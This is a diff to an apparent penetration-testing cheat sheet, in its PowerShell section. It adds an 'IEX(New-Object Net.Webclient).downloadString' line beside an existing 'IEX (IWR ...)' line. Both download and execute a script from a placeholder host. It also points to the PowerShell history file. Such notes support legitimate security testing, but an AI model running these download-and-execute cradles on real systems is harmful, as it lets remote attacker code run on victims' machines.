@@ -28,7 +28,8 @@ Ref: https://book.hacktricks.xyz/pentesting/pentesting-ldap
 ### PowerShell
 ```
 C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt   # check powershell history
-IEX ( IWR http://[IP_ADDR]/[PATH] -UseBasicParsing)   # equil linux wget http://[IP_ADDR]/PATH to upload file to the server
+IEX ( IWR http://[IP_ADDR]/[PATH] -UseBasicParsing)   # equil linux wget http://[IP_ADDR]/[PATH] to upload file to the server
+IEX(New-Object Net.Webclient).downloadString('http://[IP_ADDR]/[PATH]')
 ```
 
 ### Metasploit
